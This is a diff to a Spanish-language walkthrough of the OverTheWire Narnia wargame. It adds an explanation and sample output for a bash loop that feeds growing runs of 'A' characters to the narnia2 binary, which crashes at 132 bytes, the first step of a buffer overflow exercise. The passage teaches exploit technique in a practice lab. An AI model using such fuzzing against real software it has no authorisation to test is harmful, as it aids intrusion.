@@ -38,3 +38,10 @@ Entonces, podemos comenzar obteniendo el offset de falla (que será alrededor de
 ```bash
 for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done
 ```
+
+Todo lo que hace son bucles de 1 a 300 y repite el número cada vez, pero también imprime "A" esa cantidad de veces mientras la pasa como argumento al binario, de modo que podamos seguir los números hasta encontrar Segmentation fault.
+
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
+Segmentation fault
+```
